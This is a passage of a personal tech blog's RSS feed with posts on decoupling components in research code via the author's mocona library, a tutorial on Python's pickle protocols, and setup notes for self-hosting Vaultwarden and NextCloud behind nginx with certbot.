id="fnref:4"><a href="#fn:4">4</a></sup>). Components are tightly coupled to their parents, and maintenance becomes difficult. The second is similar, except we are making <code>Model</code> into the broker between <code>Trainer</code> and <code>ComponentA</code>.</p><p >A more generalized version of the problem: In a system with tree-like hierarchical structure, how would the communication be made between two non-adjacent components?</p><figure class="graphviz"><svg xmlns="http://www.w3.org/2000/svg" width="262pt" height="88pt" viewBox="0 0 262.46 88.49"><g class="graph"><path fill="none" d="M0 88.49V0h262.46v88.49z"/><g class="node" transform="translate(4 84.49)"><path fill="#fff5ee" stroke="#444" d="m31.4-24.04 1.76-.09 1.75-.13 1.71-.17 1.69-.21 1.65-.26 1.6-.29 1.55-.34 1.49-.37 1.42-.42 1.36-.44 1.29-.49 1.21-.52 1.13-.55 1.04-.58.96-.62.86-.64.78-.66.68-.7.59-.71.49-.73.4-.76.31-.77.21-.78.12-.8.04-.81-.06-.81-.14-.82-.22-.82-.3-.83-.37-.82-.45-.82-.52-.82-.58-.8-.64-.8-.7-.78-.75-.77-.8-.76-.85-.73-.88-.72-.93-.69-.96-.66-.99-.65-1.02-.61-1.04-.58-1.07-.55-1.08-.52-1.1-.49-1.12-.45-1.13-.41-1.14-.37-1.14-.34-1.16-.29-1.16-.26-1.17-.21-1.17-.17-1.17-.13-1.17-.09-1.18-.04h-1.17l-1.18.04-1.17.09-1.18.13-1.17.17-1.16.21-1.16.26-1.16.29-1.15.34-1.13.37-1.13.41-1.12.45-1.1.49-1.08.52-1.07.55-1.04.58-1.02.61-.99.65-.96.66-.93.69-.89.72-.84.73-.8.76-.76.77-.69.78-.65.8-.58.8-.51.82-.45.82-.38.82-.3.83-.22.82-.14.82-.05.81.03.81.13.8.21.78.3.77.4.76.5.73.59.71.68.7.77.66.87.64.96.62 1.04.58 1.13.55 1.21.52 1.28.49 1.36.44 1.43.42 1.49.37 1.55.34 1.6.29 1.65.26 1.68.21 1.72.17 1.74.13 1.76.09 1.78.04h1.77z"/><text x="28.74" y="-34.7" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">A</text></g><g class="node" transform="translate(4 84.49)"><path fill="#fff5ee" stroke="#444" d="m125.89-49.04 1.76-.09 1.74-.13 1.72-.17 1.69-.21 1.64-.26 1.6-.29 1.55-.34 1.49-.37 1.43-.42 1.36-.44 1.29-.49 1.21-.52 1.13-.55 1.04-.58.95-.62.87-.64.78-.66.68-.7.59-.71.49-.73.4-.76.31-.77.21-.78.12-.8.03-.81-.05-.81-.14-.82-.22-.82-.3-.83-.38-.82-.44-.82-.52-.82-.58-.8-.64-.8-.7-.78-.75-.77-.8-.76-.85-.73-.89-.72-.92-.69-.96-.66-.99-.65-1.02-.61-1.05-.58-1.06-.55-1.09-.52-1.1-.49-1.11-.45-1.13-.41-1.14-.37-1.15-.34-1.15-.29-1.16-.26-1.17-.21-1.17-.17-1.17-.13-1.18-.09-1.17-.04h-1.18l-1.17.04-1.18.09-1.17.13-1.17.17-1.17.21-1.16.26-1.15.29-1.15.34-1.14.37-1.13.41-1.11.45-1.1.49-1.09.52-1.06.55-1.05.58-1.02.61-.99.65-.96.66-.92.69-.89.72-.85.73-.8.76-.75.77-.7.78-.64.8-.58.8-.52.82-.44.82-.38.82-.3.83-.22.82-.14.82-.05.81.03.81.12.8.22.78.3.77.4.76.49.73.59.71.68.7.78.66.87.64.95.62 1.05.58 1.12.55 1.21.52 1.29.49 1.36.44 1.43.42 1.49.37 1.55.34 1.6.29 1.64.26 1.69.21 1.72.17 1.74.13 1.76.09 1.77.04h1.78z"/><text x="123.23" y="-59.7" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">B</text></g><g class="edge" transform="translate(4 84.49)"><path fill="none" stroke="#444" d="m53.08-46.05 31.71-8.58"/><path fill="#444" stroke="#444" d="m83.6-57.93 10.57.77-8.74 5.99z"/></g><g class="node" transform="translate(4 84.49)"><path fill="#fff5ee" stroke="#444" d="m125.89-.04 1.76-.09 1.74-.13 1.72-.17 1.69-.21 1.64-.26 1.6-.29 1.55-.34 1.49-.37 1.43-.42 1.36-.44 1.29-.49 1.21-.52 1.13-.55 1.04-.58.95-.62.87-.64.78-.66.68-.7.59-.71.49-.73.4-.76.31-.77.21-.78.12-.8.03-.81-.05-.81-.14-.82-.22-.82-.3-.83-.38-.82-.44-.82-.52-.82-.58-.8-.64-.8-.7-.78-.75-.77-.8-.76-.85-.73-.89-.72-.92-.69-.96-.66-.99-.65-1.02-.61-1.05-.58-1.06-.55-1.09-.52-1.1-.49-1.11-.45-1.13-.41-1.14-.37-1.15-.34-1.15-.29-1.16-.26-1.17-.21-1.17-.17-1.17-.13-1.18-.09-1.17-.04h-1.18l-1.17.04-1.18.09-1.17.13-1.17.17-1.17.21-1.16.26-1.15.29-1.15.34-1.14.37-1.13.41-1.11.45-1.1.49-1.09.52-1.06.55-1.05.58-1.02.61-.99.65-.96.66-.92.69-.89.72-.85.73-.8.76-.75.77-.7.78-.64.8-.58.8-.52.82-.44.82-.38.82-.3.83-.22.82-.14.82-.05.81.03.81.12.8.22.78.3.77.4.76.49.73.59.71.68.7.78.66.87.64.95.62 1.05.58 1.12.55 1.21.52 1.29.49 1.36.44 1.43.42 1.49.37 1.55.34 1.6.29 1.64.26 1.69.21 1.72.17 1.74.13 1.76.09 1.77.04h1.78z"/><text x="123.23" y="-10.7" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">C</text></g><g class="edge" transform="translate(4 84.49)"><path fill="none" stroke="#444" d="M56.49-32.8c9.69 2.51 20.78 5.39 31.06 8.05"/><path fill="#444" stroke="#444" d="m88.42-28.14 8.8 5.9-10.56.88z"/></g><g class="node" transform="translate(4 84.49)"><path fill="#fff5ee" stroke="#444" d="m228.38-.04 1.76-.09 1.74-.13 1.72-.17 1.68-.21 1.65-.26 1.6-.29 1.55-.34 1.49-.37 1.43-.42 1.36-.44 1.28-.49 1.21-.52 1.13-.55 1.05-.58.95-.62.87-.64.77-.66.68-.7.59-.71.5-.73.4-.76.3-.77.22-.78.12-.8.03-.81-.05-.81-.14-.82-.22-.82-.3-.83-.38-.82-.45-.82-.51-.82-.58-.8-.65-.8-.69-.78-.76-.77-.8-.76-.84-.73-.89-.72-.93-.69-.96-.66-.99-.65-1.02-.61-1.04-.58-1.07-.55-1.08-.52-1.1-.49-1.12-.45-1.12-.41-1.14-.37-1.15-.34-1.16-.29-1.16-.26-1.16-.21-1.17-.17-1.17-.13-1.18-.09-1.17-.04h-1.18l-1.18.04-1.17.09-1.17.13-1.17.17-1.17.21-1.16.26-1.15.29-1.15.34-1.14.37-1.13.41-1.11.45-1.11.49-1.08.52-1.07.55-1.04.58-1.02.61-.99.65-.96.66-.93.69-.88.72-.85.73-.8.76-.75.77-.7.78-.64.8-.58.8-.52.82-.45.82-.37.82-.3.83-.22.82-.14.82-.06.81.04.81.12.8.21.78.31.77.4.76.49.73.59.71.68.7.78.66.86.64.96.62 1.04.58 1.13.55 1.21.52 1.29.49 1.36.44 1.42.42 1.5.37 1.54.34 1.6.29 1.65.26 1.69.21 1.71.17 1.75.13 1.76.09 1.77.04h1.78z"/><text x="225.72" y="-10.7" fill="#444" font-family="Times New Roman,serif" font-size="14" text-anchor="middle">D</text></g><g class="edge" transform="translate(4 84.49)"><path fill="none" stroke="#444" stroke-dasharray="5,2" d="M157.07-48.73c12.24 5.96 26.04 12.7 37.98 18.52"/><path fill="#444" stroke="#444" d="m155.85-45.43-7.46-7.53 10.53 1.23zM196.57-33.36l7.46 7.53-10.53-1.24z"/><text x="174.47" y="-43.46" fill="#444" font-family="Times New Roman,serif" font-size="10" text-anchor="middle">??</text></g><g class="edge" transform="translate(4 84.49)"><path fill="none" stroke="#444" d="M151.69-15.75h34.13"/><path fill="#444" stroke="#444" d="m185.78-19.25 10 3.5-10 3.5z"/></g></g></svg></figure><p  class="nomargin"> It is not some kind of novel research problem, but one already addressed in practical scenes. Following the single-responsibility principle, we can use a standalone service responsible for managing the communication. Such would be much common in modern Web development, since web components are usually organized in a tree and pass messages more frequently. Mature and production-ready solutions exist like <em>Event-Bus pattern</em> or <em>centralized state management</em> <sup id="fnref:5"><a href="#fn:5">5</a></sup>, which are all instances of the design pattern. Instead of relying on the target (or the path to the target), the components now depend only on the service object, and the system becomes less coupled.</p><p >So why won’t we use the techniques? Well, if some libaries integrate the stuff, we are glad to try; if not, we have to implement by ourselves, but sorry, we are running out of time.</p><p  class="nomargin"> For programmers in production group, they care more about coupling, otherwise the maintenance is getting painful. They would apply every best practice and design patterns that could be found from textbooks or from some blog posts.</p><p  class="nomargin"> But as researchers, we might have taken the course of software engineering, but we seldom do this. I’ve skimmed so much released code for papers on Github, most of which have their logic for building model, loading data and training tightly coupled, fragile and with mere flexibility for extending. They might be enough to showcase the papers, but are far from a good codebase. But sometimes we have no choice <sup id="fnref:6"><a href="#fn:6">6</a></sup> but to extend upon it. There are indeed someone paying efforts to make well-designed and easy-to-extend codebases <sup id="fnref:7"><a href="#fn:7">7</a></sup>, but apparently they could not cover all extension demand from developers. We are from time to time being limited by our codebase, badly-designed or over-designed. What’s worse, we have a deadline ahead, and to rush out the idea, we are practicing so many anti-patterns – communicating via global variables or god object, duplicating the logic here and there, or writing meaningless boilerplate codes. The codebase would finally grow into spaghetti. Badly-cooked spaghetti.</p><p >It was then I began to think about why practices for production could hardly apply to a research project. The answer is that a research project is not production-ready, but evolving and iterating rapidly with aimless target, rather like a prototype. A prototype might grow into a production, but research project won’t, mostly ending after some paper deadlines. The dogmatism of design patterns are too verbose, and sometimes complicated. Researchers seldom use them, but run for some easy-to-use-but-dirty hacking or tricks.</p><p >And that’s the background of <a href="https://github.com/hsfzxjy/mocona">hsfzxjy/mocona</a>. It implements some patterns like <em>Dependency Injection</em> and <em>Event Emitter</em>, in addressing the problem of communication between components. The library is deliberately designed to be “magical”, that is, do most of the heavy work behind the scene, but expose a very simple interface or (self-made) “syntax” for users. It is evil and an anti-pattern to be implicit and magical in Python. But there’re people tired or more afraid of verbosity, for which they are willing to write even worse code. If the library could help, they would be glad to make a trade-off between verbosity and anti-pattern.</p><div class="footnotes"><ol><li class="footnote" id="fn:1">Loaders and preprocessors for various datasets, training loop, and evaluation metrics, <em>etc.</em></li><li class="footnote" id="fn:2">Logger, data loader, model, evaluator, <em>etc.</em></li><li class="footnote" id="fn:3">e.g., taking <code>(img, offset)</code> as input and supervised by <code>(gtseg, gtoffset)</code></li><li class="footnote" id="fn:4">[God Object - Wikipedia](<a href="http://en.wikipedia.org/wiki/God_object">http://en.wikipedia.org/wiki/God_object</a></li><li class="footnote" id="fn:5">such as <a href="https://redux.js.org/">Redux</a> for React.js</li><li class="footnote" id="fn:6">you would like to improve the method and that’s the only reliable way to reproduce it</li><li class="footnote" id="fn:7">We thank projects like <a href="https://github.com/facebookresearch/detectron2">Detectron2</a> and series of <a href="https://github.com/open-mmlab">OpenMMLab</a>.</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      
      <comments>https://i.hsfzxjy.site/unravelling-mocona-verbosity-or-anti-pattern/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Unravelling mocona] Part 0 - Preface</title>
      <link>https://i.hsfzxjy.site/unravelling-mocona-preface/</link>
      <guid>https://i.hsfzxjy.site/unravelling-mocona-preface/</guid>
      <pubDate>Sat, 11 Sep 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;The early idea of &lt;a href=&quot;https://github.com/hsfzxjy/mocona&quot;&gt;hsfzxjy/mocona&lt;/a&gt; was come up with in late April. It was not until July t</description>
        
      
      
      
      <content:encoded><![CDATA[<p >The early idea of <a href="https://github.com/hsfzxjy/mocona">hsfzxjy/mocona</a> was come up with in late April. It was not until July that I figure out a reasonable design for the project. I finished most of my idea and released the first version approaching August. Nevertheless, there’s no chance for me to share the story behind the library. Now another month gone, it’s time to do some writing.</p><p >The series, as I planning, would cover the motivation of creating mocona, some technical details and usage, along with some critical thinking on the creative process. For whom interested in CPython internals or would like to extend the language, it is worth to read through.</p><h2 id="table-of-contents">Table of Contents</h2><ul><li><a href="../2021-09-16-unravelling-mocona-verbosity-or-anti-pattern/">Part 1 - Verbosity or Anti-Pattern</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Series/">Series</category>
      
      
      
      <comments>https://i.hsfzxjy.site/unravelling-mocona-preface/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Understanding pickle in Python</title>
      <link>https://i.hsfzxjy.site/clarifying-pickle-in-python/</link>
      <guid>https://i.hsfzxjy.site/clarifying-pickle-in-python/</guid>
      <pubDate>Fri, 13 Aug 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;The module &lt;code&gt;pickle&lt;/code&gt; shipped in Python could be used for generic-purpose object serialization and de-serialization. It’s been </description>
        
      
      
      
      <content:encoded><![CDATA[<p >The module <code>pickle</code> shipped in Python could be used for generic-purpose object serialization and de-serialization. It’s been widely adopted or recommended as backend in scenarios like persisting states or IPC.</p><p  class="nomargin"> Employed by many famous frameworks, though, the magic behind it still seems to be vague for daily users, especially guys fresh to the language. People come across “unpicklable” errors from time to time, but don’t know the reason; or re-invent state persistence by themselves, even if <code>pickle</code> could be competent. People sometimes write error-prone codes, merely because they are afraid of or unaware of <code>pickle</code>.</p><p  class="nomargin"> This post thus attempts to clarify the usage of <code>pickle</code> module in an easy understanding way, by answering three questions.</p><h2 id="what-kind-of-object-is-picklable">What kind of object is picklable?</h2><p >Before stepping in, let’s take a swift overview for the design of <code>pickle</code> module.</p><p ><code>pickle</code> separates the logic of serialization / de-serialization into two parts, using some kind of intermediate representation (IR). During serialization, an object is firstly transformed into IR, and then dumped into byte stream by <code>pickle</code>. De-serialization operates conversely. For most of the time, we users should only care about the first aspect, that is, the conversion between Python objects and IR.</p><p >To ease the burden of using <code>pickle</code>, the module set up a few principles that could generalize the concept “picklable” automatically to most user-defined objects. Users then need not to communicate with IR. The principles could be roughly summarized into</p><ol><li>Most built-in Python types and their instances are picklable.</li><li>Containers like <em>lists</em>, <em>dicts</em> or <em>sets</em> with only picklable elements are picklable.</li><li>Top-level classes or functions of a module are picklable (if configured properly).</li><li>Objects with picklable <code>__dict__</code> and picklable type are picklable.</li><li>Objects holding external resources (<code>open()</code>, <code>socket.socket()</code>, <em>etc.</em>) are usually NOT picklable.</li></ol><p  class="par"> Principle 1 and 2 ensures that we can easily pickle built-in types <sup id="fnref:1"><a href="#fn:1">1</a></sup>, values <sup id="fnref:2"><a href="#fn:2">2</a></sup> and their composition <sup id="fnref:3"><a href="#fn:3">3</a></sup>, which covers a large variety of daily-used objects.</p><p  class="nomargin"> If you want to pickle custom objects, Principle 3 and 4 come into play. If you define your class at the top-level of a module (and usually you should), the class is automatically picklable. An object instantiated from that class, if holding only picklable attributes (stored in <code>__dict__</code>), is also picklable.</p><p  class="nomargin"> How convenient! Nothing is needed but a simple <code>pickle.load</code> or <code>pickle.dump</code> to enjoy pickle services .</p><p >Principle 3 comes with a remark <em>“if configured properly”</em>. Technically, module-level values are picklable if they have the correct <code>__qualname__</code>. <code>__qualname__</code> dictates the name of variable that holds the value. This is automatically done if the value is a class or function:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>: <span class="hljs-keyword">pass</span></span><br><span class="line">C.__qualname__  <span class="hljs-comment"># &#x27;C&#x27;</span></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(): <span class="hljs-keyword">pass</span></span><br><span class="line">f.__qualname__  <span class="hljs-comment"># &#x27;f&#x27;</span></span><br></pre></div></div><p  class="par"> which enables pickling for user-defined classes or functions.</p><p  class="nomargin"> But this does not apply to lambdas. A lambda by default would have <code>__qualname__ == &quot;&lt;lambda&gt;&quot;</code>, which does not match the variable name that holds it. <code>pickle</code> thus cannot handle it normally</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>f = <span class="hljs-keyword">lambda</span>: <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>pickle.dumps(f)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;</span><br><span class="line">_pickle.PicklingError: Cant pickle &lt;function &lt;<span class="hljs-keyword">lambda</span>&gt; at <span class="hljs-number">0x7f7ed81ad3a0</span>&gt;: attribute look up &lt;<span class="hljs-keyword">lambda</span>&gt; on __main__ failed</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>f.__qualname__</span><br><span class="line"><span class="hljs-string">&#x27;&lt;lambda&gt;&#x27;</span></span><br></pre></div></div><p  class="par"> To make it possible, one could assign <code>__qualname__</code> for it manually</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>f.__qualname__ = <span class="hljs-string">&#x27;f&#x27;</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>pickle.dumps(f)</span><br><span class="line"><span class="hljs-string">b&#x27;\x80\x04\x95\x12\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x01f\x94\x93\x94.&#x27;</span></span><br></pre></div></div><p >Principle 5 might be wierd at the first sight, but is indeed reasonable.</p><p  class="nomargin"> Let’s consider if a <code>socket</code> object could be dumped, and we load it at some point afterwards. There exist so many causes that could fail the de-serialization. Peer host malfunctions, link layer breaks, or out of system resources. Even if it succeeds, the loaded object is not identical to the original one, since it references to external resource with different internal state.</p><p  class="nomargin"> <code>pickle</code> therefore disables the stuff – but if you wish, you could control it by customizing the serialization / de-serialization behavior. Here we come to</p><h2 id="what-if-my-object-is-not-picklable">What if my object is not picklable?</h2><p >From now you would need to learn something about the IR, as well as the object protocol of pickling.</p><p >Fundamentally, an object’s <code>__reduce__()</code> would be called when it’s being serialized. The method’s expected behavior is described by <a href="https://docs.python.org/3/library/pickle.html#object.__reduce__">the documentation</a> in detail. Unoffically, we could regard the return value as kind of IR, which dictates how to locate the object in specific module, or necessary information to restore the object from scratch.</p><p  class="nomargin"> According to the doc, <code>__reduce__()</code> should return either a string or a tuple. We are going to take apart the two cases in the next moment.</p><p >If a string returned, it should be the name of a local variable relative to the object’s module. Remember the <code>__qualname__</code> trick above? They do the same job. <code>pickle</code> treats the returned string as <code>__qualname__</code> of the object, storing it along with the module name <code>__module__</code> at serialization. The de-serializer afterwards would look up an attribute in the module with that string as name, and retrieve the object directly without creating from scratch.</p><p  class="nomargin"> It is useful for singleton object, i.e., object that be instantiated once and survives the whole program lifetime, for example, a database connection pool. We thus would not struggle on how to record the internal states for these objects.</p><p >When a tuple returned, well, it’s being a bit complicated. The tuple should contain 2~6 elements <sup id="fnref:4"><a href="#fn:4">4</a></sup>. The meaning of the elements would be described after, but before which, let’s get some understanding of how an object is created.</p><p  class="nomargin"> In the assumption of <code>pickle</code> module, an object is made up of a <em>skeleton</em>, and <em>states</em>. A skeleton is an initial version of an object, which is returned by a callable named <em>“constructor”</em>. Usually the constructor is the object’s <code>__new__()</code> method, but not necessarily. It could also be some factory function. States refer to all other attributes or elements that the object holds, which could be simple Python objects or external resources. At de-serialization, <code>pickle</code> would first set up a skeleton by calling constructor, then filling up the states. Either step can be customized to accord with your application logic.</p><p  class="nomargin"> Now we could talk about the scheme of returned tuple. </p><p  class="nomargin"> The 1-st and 2-nd elements describe how to set up a skeleton. The 1-st element is the constructor callable, and the 2-nd be a tuple of positional arguments, which the constructor takes. The two elements are both required. If no argument is needed, one should leave an empty tuple.</p><p  class="nomargin"> The remaining elements are optional, describing the states. <code>pickle</code> employs various strategies of restoring states. If the 6-th element provided, it should be a callable with signature <code>(obj, state)</code>, which performs state updating with the object and the 3-rd element as arguments. If not provided, <code>pickle</code> would look up a method named <code>__setstate__</code> on the object, which shares the same signature, and if found, it is served as the state updater. Otherwise, <code>pickle</code> expects the 3-rd element to be a dict, which would then be added to the object’s <code>__dict__</code>. The 4-th and 5-th elements are specialized for list- or dict-like object and less used. If supplied, they should be a list and a dict, which update the object through <code>.extend()</code> and <code>.update()</code> methods, respectively.</p><p >Directly implementing <code>__reduce__()</code> could be error-prone. <code>pickle</code> thus provides other object protocols to simplify the task. A list of the special methods could be found <a href="https://docs.python.org/3/library/pickle.html#pickling-class-instances">here</a>. Users can implement some of them to serve the same purpose, e.g., <code>__getnewargs_ex__()</code> or <code>__getnewargs__()</code> for the 2-nd element, and <code>__getstate__()</code> for the 3-rd element.</p><p >Now let’s back to the title – what if my object is not picklable? The answer is, implementing your own pickling / unpickling logics via <code>__reduce__()</code> or other special methods. <a href="https://docs.python.org/3/library/pickle.html#pickle-state">This section</a> in the docs showcases a good example, where an object maintains a file which should be re-opened and re-sought at de-serialization.</p><p  class="nomargin"> Here we discussed the scenario of serializing our customized types. Now what if the object to be pickled is out of our control? </p><h2 id="what-if-the-object-is-out-of-my-control">What if the object is out of my control?</h2><p >In some cases, one might have the demand to alter the pickling behavior for a specific type, either it is not supported, or the serialized byte stream is not efficient enough. The type is maintained by some libaries, and out of your control, so you could not change its <code>__reduce__()</code> to fit your requirement. <code>pickle</code> introduces some other interfaces to mitigate the problem from different aspects.</p><h3 id="dispatch-tables">Dispatch Tables</h3><p >This is the recommended way to pickle objects without disturbing any other external codes. Aside from looking up special methods on object, <code>pickle</code> also relies on module <code>copyreg</code> to seek reducers. The function <code>copyreg.pickle(type, reducer)</code> associates callable <code>reducer</code> as the reducer function of type <code>type</code>. <code>reducer</code> should accept arguments and return IR just like a <code>__reduce__()</code> method, and it shadows the original <code>__reduce__()</code> on <code>type</code>. <a href="https://docs.python.org/3/library/pickle.html#dispatch-tables">The documentation</a> showcases the stuff with a simple example.</p><h3 id="persistent-id">Persistent ID</h3><p >Sometimes you would like to persist external objects that could be uniquely identified by some IDs. Think about entries of a database table, where foreign keys act as those IDs. Here storing IDs directly would be better and more efficient than turning the objects into IR. <code>pickle</code> have persistent ID for this purpose.</p><p  class="nomargin"> Unlike dispatch tables, resolution of persistent IDs is not defined in <code>pickle</code>. One should sub-class <code>Pickler</code> and <code>Unpickler</code> classes and overwrite <code>persistent_id()</code> and <code>persistent_load()</code>, respectively. An example of pickling table entries with persistent IDs could be found <a href="https://docs.python.org/3/library/pickle.html#persistence-of-external-objects">here</a>.</p><h3 id="reducer_override">reducer_override()</h3><p >With only types given, users might still not able to decide the pickling behavior for some objects. If you want to pickle user-defined classes (not their instances) via dispatch tables, all reducings would be delegated to the same method, since in Python user-defined classes share a same base class <code>type</code>. Python 3.8 introduces the <code>reducer_override()</code> method on <code>Pickler</code> class to handle custom pickling in arbitary conditions. You might check technical details and examples at <a href="https://docs.python.org/3/library/pickle.html#custom-reduction-for-types-functions-and-other-objects">this link</a>.</p><blockquote><p >Personally, I found dispatch tables the most useful. You can always ensemble persistent IDs using IR, and dealing several different objects within a same reducer function is actually not that bad. In contrast, dispatch tables could enable the customization in a global manner, which is useful at some time.</p></blockquote><hr><h2 id="conclusion-1">Conclusion</h2><p >It’s such a long way here, but we made it! </p><p  class="nomargin"> We’ve seen some basic usage of <code>pickle</code>, the fundamental object protocols of pickling, as well as some other interfaces for customization. Hope the stuffs might give you a rough idea on this module, and be helpful for dealing with pickling problems.</p><div class="footnotes"><ol><li class="footnote" id="fn:1"><code>int</code>, <code>str</code>, <em>etc.</em></li><li class="footnote" id="fn:2"><code>42</code>, <code>&quot;foobar&quot;</code>, <em>etc.</em></li><li class="footnote" id="fn:3">such as <code>[int, &#123;42: &quot;foobar&quot;&#125;]</code></li><li class="footnote" id="fn:4">in Python with version lower than 3.8, this would be 2~5 elements</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/pickle/">pickle</category>
      
      
      <comments>https://i.hsfzxjy.site/clarifying-pickle-in-python/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Rough Notes on Deploying Vaultwarden &amp; NextCloud Bookmarks</title>
      <link>https://i.hsfzxjy.site/rough-notes-on-deploying-vaultwarden-and-nextcloud-bookmarks/</link>
      <guid>https://i.hsfzxjy.site/rough-notes-on-deploying-vaultwarden-and-nextcloud-bookmarks/</guid>
      <pubDate>Sun, 25 Jul 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;I’ve been struggling for years on two things: synchronize passwords and blog posts I have read across devices. The problem kills me so m</description>
        
      
      
      
      <content:encoded><![CDATA[<p >I’ve been struggling for years on two things: synchronize passwords and blog posts I have read across devices. The problem kills me so much since my devices, an Android mobile, an Ubuntu laptop and an iPad, are less supported by big App companies. Aside, I want to gain control for all my data, so there should better exist a self-hosted solution. The problem are partially solved recently by deploying <a href="https://github.com/dani-garcia/vaultwarden/wiki/Enabling-HTTPS">Vaultwarden</a> and <a href="https://nextcloud.com/">NextCloud</a> on VPS. This blog post dictates the setup process and problems I met, in case anyone searching for this topic.</p><h2 id="install-vaultwarden-and-nextcloud-on-vps">Install Vaultwarden and NextCloud on VPS</h2><p >The two services are both luckily dockerized. To install there’s nothing more complicated than a command:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">mkdir</span> vaultwarden &amp;&amp; <span class="hljs-built_in">cd</span> vaultwarden</span><br><span class="line"><span class="hljs-built_in">mkdir</span> data</span><br><span class="line">docker run -d --name vaultwarden \</span><br><span class="line">    -v <span class="hljs-variable">$HOME</span>/vaultwarden/data/:/data/ \</span><br><span class="line">    -p 29999:80 vaultwarden/server:latest</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">mkdir</span> nc &amp;&amp; <span class="hljs-built_in">cd</span> nc</span><br><span class="line"><span class="hljs-built_in">mkdir</span> data</span><br><span class="line">docker run -d --name nextcloud \</span><br><span class="line">    -v <span class="hljs-variable">$HOME</span>/nc/data:/var/www/html \</span><br><span class="line">    -p 14514:80 nextcloud</span><br></pre></div></div><p  class="par"> External mounted volumes here are for persisting service data inside containers. The folders should be back-up periodically, in case for potential data loss.</p><h2 id="enable-https-for-both-services">Enable HTTPS for Both Services</h2><p ><a href="https://github.com/dani-garcia/vaultwarden/wiki/Enabling-HTTPS">Several options</a> exist to enable HTTPS for the sites. I pick the one that hides both services behind an nginx, which deals with SSL connection from clients and bypasses the content to the containers. This setup would require an nginx config like:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-section">server</span> {</span><br><span class="line">    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;</span><br><span class="line">    <span class="hljs-attribute">server_name</span> nc.hsfzxjy.site;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-section">location</span> / {</span><br><span class="line">        <span class="hljs-attribute">proxy_pass</span> http://localhost:14514;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-section">server</span> {</span><br><span class="line">    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;</span><br><span class="line">    <span class="hljs-attribute">server_name</span> v.hsfzxjy.site;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-section">location</span> / {</span><br><span class="line">        <span class="hljs-attribute">proxy_pass</span> http://localhost:29999;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> With configs ready, we use <code>certbot</code> to issue certificates for them.</p><h3 id="certbot">certbot</h3><p ><a href="https://certbot.eff.org/">certbot</a> is a CLI tool from <a href="https://letsencrypt.org/getting-started/">Let’s Encrypt</a>, easing the effort to setup an HTTPS-enabled site. Install <code>certbot</code> on Ubuntu for nginx following <a href="https://certbot.eff.org/lets-encrypt/ubuntufocal-nginx">the instruction</a></p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">sudo snap install core; sudo snap refresh core</span><br><span class="line">sudo snap install --classic certbot</span><br><span class="line">sudo <span class="hljs-built_in">ln</span> -s /snap/bin/certbot /usr/bin/certbot</span><br><span class="line">sudo certbot --nginx</span><br><span class="line"><span class="hljs-comment"># select the domain names to issue in the interactive interface</span></span><br></pre></div></div><p  class="par"> Note that the issuer server is banned by GFW, and you might need a proxy to get it passed. <code>certbot</code> also edits nginx config files automatically to enable the certificates, so all you need to do is to reload the nginx service.</p><h3 id="update-config-for-nextcloud">Update Config for NextCloud</h3><p >NextCloud needs re-configuration to support the nginx proxying. Edit file <code>~/nc/data/config/config.php</code> and add the following lines</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-variable">$CONFIG</span> = <span class="hljs-keyword">array</span>(</span><br><span class="line">  <span class="hljs-string">&#x27;overwriteprotocol&#x27;</span> =&gt; <span class="hljs-string">&#x27;https&#x27;</span>,</span><br><span class="line">  <span class="hljs-string">&#x27;overwrite.cli.url&#x27;</span> =&gt; <span class="hljs-string">&#x27;https://nc.hsfzxjy.site&#x27;</span>,</span><br><span class="line">  <span class="hljs-string">&#x27;overwritehost&#x27;</span> =&gt; <span class="hljs-string">&#x27;nc.hsfzxjy.site&#x27;</span>,</span><br><span class="line">  <span class="hljs-string">&#x27;trusted_domains&#x27;</span> =&gt;</span><br><span class="line">  <span class="hljs-keyword">array</span> (</span><br><span 